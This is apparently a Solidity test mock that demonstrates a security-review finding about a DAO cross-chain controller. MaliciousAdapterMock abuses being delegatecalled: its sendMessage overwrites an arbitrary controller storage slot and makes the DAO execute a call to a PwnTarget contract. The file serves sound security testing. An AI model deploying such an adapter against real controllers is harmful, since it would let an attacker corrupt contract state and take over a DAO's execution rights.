// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.8.17;

import {
    IBaseAdapter
} from "../../../../src/common/crosschain/adapters/IBaseAdapter.sol";
import {
    Action,
    IExecutor
} from "../../../../src/common/executors/IExecutor.sol";

/// @notice An adapter that abuses being `delegatecall`ed, used to DEMONSTRATE —
///         not to mitigate — the residual risk of the `delegatecall` send
///         mechanism (security-review finding 7).
/// @dev DO NOT USE IN PRODUCTION!
///
///      Whoever holds `UPDATE_CONFIG_PERMISSION` on a `CrossChainController`
///      can point a lane at a contract like this one. The next
///      `forwardMessage` — triggered by anybody with
///      `FORWARD_MESSAGE_PERMISSION`, for any legitimate reason — then runs
///      this code IN THE CONTROLLER'S CONTEXT, which means it can:
///        1. overwrite any storage slot of the controller, and
///        2. make the DAO execute arbitrary actions, because the controller
///           holds `EXECUTE_PERMISSION`.
///      Both are exercised by `sendMessage` below.
contract MaliciousAdapterMock is IBaseAdapter {
    address private immutable _controller;
    address private immutable _dao;
    address private immutable _target;
    bytes32 private immutable _slot;
    bytes32 private immutable _value;

    /// @param controller_ The controller whose context will be hijacked.
    /// @param dao_ The DAO the controller can execute on.
    /// @param target_ A contract to call through the DAO (`pwn()`).
    /// @param slot_ An arbitrary controller storage slot to overwrite.
    /// @param value_ The value to write into `slot_`.
    constructor(
        address controller_,
        address dao_,
        address target_,
        bytes32 slot_,
        bytes32 value_
    ) {
        _controller = controller_;
        _dao = dao_;
        _target = target_;
        _slot = slot_;
        _value = value_;
    }

    function CROSS_CHAIN_CONTROLLER() external view override returns (address) {
        return _controller;
    }

    function toNativeChainId(
        uint256 c
    ) external pure override returns (uint256) {
        return c;
    }

    function fromNativeChainId(
        uint256 c
    ) external pure override returns (uint256) {
        return c;
    }

    function quoteFee(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure override returns (address, uint256) {
        return (address(0), 0);
    }

    /// @dev Ignores its arguments entirely and instead corrupts the caller.
    function sendMessage(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external payable override returns (bytes32 messageId, uint256 fee) {
        // 1. Arbitrary storage write in the controller's context.
        bytes32 slot = _slot;
        bytes32 value = _value;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            sstore(slot, value)
        }

        // 2. Arbitrary execution on the DAO, as the controller.
        Action[] memory actions = new Action[](1);
        actions[0] = Action({
            to: _target,
            value: 0,
            data: abi.encodeWithSignature("pwn()")
        });
        IExecutor(_dao).execute(keccak256("pwned"), actions, 0);

        return (bytes32(0), 0);
    }
}

/// @notice Trivial target recording that it was reached through the DAO.
/// @dev DO NOT USE IN PRODUCTION!
contract PwnTarget {
    bool public pwned;

    function pwn() external {
        pwned = true;
    }
}
